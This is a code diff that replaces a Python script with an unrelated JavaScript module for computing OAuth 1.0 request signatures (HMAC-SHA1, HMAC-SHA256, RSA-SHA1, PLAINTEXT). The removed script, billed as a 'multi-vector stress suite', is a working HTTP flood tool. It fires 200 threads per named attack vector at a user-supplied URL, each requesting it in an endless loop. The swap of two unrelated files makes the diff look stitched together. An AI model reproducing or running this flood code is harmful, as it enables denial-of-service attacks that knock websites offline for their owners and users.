@@ -1,75 +1,146 @@
-import threading
-import requests
-import time
-import sys
-import os
+var crypto = require('crypto')
 
-# --- PROFESSIONAL VECTOR CONFIGURATION ---
-# 16 Attack Vectors for Layer 7 Analysis
-VECTORS = [
-    "FLOOD", "GLORY", "CIBI", "QUANTUM", "PIDORAS", "BYPASS", 
-    "THUNDER", "DESTROY", "FLOODVIP", "MIXBIL", "H2-FUMI", 
-    "H2-DEVIL", "H2-BYPASS", "H2-FLOOD", "HTTPCOSTUM", "ULTRA"
-]
+function sha (key, body, algorithm) {
+  return crypto.createHmac(algorithm, key).update(body).digest('base64')
+}
 
-sent_count = 0
-stop_vector = False
+function rsa (key, body) {
+  return crypto.createSign('RSA-SHA1').update(body).sign(key, 'base64')
+}
 
-def request_engine(target, vector_name):
-    global sent_count, stop_vector
-    # Professional Headers (No Random Fake Data)
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Connection': 'keep-alive',
-        'X-Request-Vector': vector_name
-    }
-    
-    while not stop_vector:
-        try:
-            # Persistent HTTP/1.1 Connection
-            response = requests.get(target, headers=headers, timeout=5)
-            sent_count += 1
-            sys.stdout.write(f"\r\033[1;32m[+] VECTOR: {vector_name} | TARGET: {target} | SENT: {sent_count} | STATUS: {response.status_code}\033[0m")
-            sys.stdout.flush()
-        except:
-            # Auto-retry if server throttles
-            continue
+function rfc3986 (str) {
+  return encodeURIComponent(str)
+    .replace(/!/g,'%21')
+    .replace(/\*/g,'%2A')
+    .replace(/\(/g,'%28')
+    .replace(/\)/g,'%29')
+    .replace(/'/g,'%27')
+}
 
-def run_suite():
-    if len(sys.argv) < 2:
-        os.system('clear')
-        print("\033[1;31m[!] USAGE: python master.py <url>\033[0m")
-        sys.exit()
+// Maps object to bi-dimensional array
+// Converts { foo: 'A', bar: [ 'b', 'B' ]} to
+// [ ['foo', 'A'], ['bar', 'b'], ['bar', 'B'] ]
+function map (obj) {
+  var key, val, arr = []
+  for (key in obj) {
+    val = obj[key]
+    if (Array.isArray(val))
+      for (var i = 0; i < val.length; i++)
+        arr.push([key, val[i]])
+    else if (typeof val === 'object')
+      for (var prop in val)
+        arr.push([key + '[' + prop + ']', val[prop]])
+    else
+      arr.push([key, val])
+  }
+  return arr
+}
 
-    target = sys.argv[1]
-    global sent_count, stop_vector
+// Compare function for sort
+function compare (a, b) {
+  return a > b ? 1 : a < b ? -1 : 0
+}
 
-    os.system('clear')
-    print("\033[1;34m" + "="*65)
-    print("      PROFESSIONAL MULTI-VECTOR STRESS SUITE - V12.0      ")
-    print("="*65 + "\033[0m")
-    print(f"[*] Target URI    : {target}")
-    print(f"[*] Total Vectors : {len(VECTORS)}")
-    print(f"[*] Thread Pool   : 200 (Optimized for Mobile)")
-    print("-" * 65 + "\n")
+function generateBase (httpMethod, base_uri, params) {
+  // adapted from https://dev.twitter.com/docs/auth/oauth and 
+  // https://dev.twitter.com/docs/auth/creating-signature
 
-    for vector in VECTORS:
-        print(f"\033[1;33m[*] INITIATING VECTOR: {vector} ...\033[0m")
-        sent_count = 0
-        stop_vector = False
-        
-        # Launching 200 Threads per Vector (Sir's Logic)
-        for i in range(200):
-            t = threading.Thread(target=request_engine, args=(target, vector))
-            t.daemon = True
-            t.start()
+  // Parameter normalization
+  // http://tools.ietf.org/html/rfc5849#section-3.4.1.3.2
+  var normalized = map(params)
+  // 1.  First, the name and value of each parameter are encoded
+  .map(function (p) {
+    return [ rfc3986(p[0]), rfc3986(p[1] || '') ]
+  })
+  // 2.  The parameters are sorted by name, using ascending byte value
+  //     ordering.  If two or more parameters share the same name, they
+  //     are sorted by their value.
+  .sort(function (a, b) {
+    return compare(a[0], b[0]) || compare(a[1], b[1])
+  })
+  // 3.  The name of each parameter is concatenated to its corresponding
+  //     value using an "=" character (ASCII code 61) as a separator, even
+  //     if the value is empty.
+  .map(function (p) { return p.join('=') })
+   // 4.  The sorted name/value pairs are concatenated together into a
+   //     single string by using an "&" character (ASCII code 38) as
+   //     separator.
+  .join('&')
 
-        # Each vector runs for 30 seconds before switching
-        time.sleep(30) 
-        stop_vector = True
-        print(f"\n\033[1;36m[#] {vector} completed. Switching to next vector...\033[0m\n")
-        time.sleep(2)
+  var base = [
+    rfc3986(httpMethod ? httpMethod.toUpperCase() : 'GET'),
+    rfc3986(base_uri),
+    rfc3986(normalized)
+  ].join('&')
 
-if __name__ == "__main__":
-    run_suite()
+  return base
+}
+
+function hmacsign (httpMethod, base_uri, params, consumer_secret, token_secret) {
+  var base = generateBase(httpMethod, base_uri, params)
+  var key = [
+    consumer_secret || '',
+    token_secret || ''
+  ].map(rfc3986).join('&')
+
+  return sha(key, base, 'sha1')
+}
+
+function hmacsign256 (httpMethod, base_uri, params, consumer_secret, token_secret) {
+  var base = generateBase(httpMethod, base_uri, params)
+  var key = [
+    consumer_secret || '',
+    token_secret || ''
+  ].map(rfc3986).join('&')
+
+  return sha(key, base, 'sha256')
+}
+
+function rsasign (httpMethod, base_uri, params, private_key, token_secret) {
+  var base = generateBase(httpMethod, base_uri, params)
+  var key = private_key || ''
+
+  return rsa(key, base)
+}
+
+function plaintext (consumer_secret, token_secret) {
+  var key = [
+    consumer_secret || '',
+    token_secret || ''
+  ].map(rfc3986).join('&')
+
+  return key
+}
+
+function sign (signMethod, httpMethod, base_uri, params, consumer_secret, token_secret) {
+  var method
+  var skipArgs = 1
+
+  switch (signMethod) {
+    case 'RSA-SHA1':
+      method = rsasign
+      break
+    case 'HMAC-SHA1':
+      method = hmacsign
+      break
+    case 'HMAC-SHA256':
+      method = hmacsign256
+      break
+    case 'PLAINTEXT':
+      method = plaintext
+      skipArgs = 4
+      break
+    default:
+     throw new Error('Signature method not supported: ' + signMethod)
+  }
+
+  return method.apply(null, [].slice.call(arguments, skipArgs))
+}
+
+exports.hmacsign = hmacsign
+exports.hmacsign256 = hmacsign256
+exports.rsasign = rsasign
+exports.plaintext = plaintext
+exports.sign = sign
+exports.rfc3986 = rfc3986
+exports.generateBase = generateBase
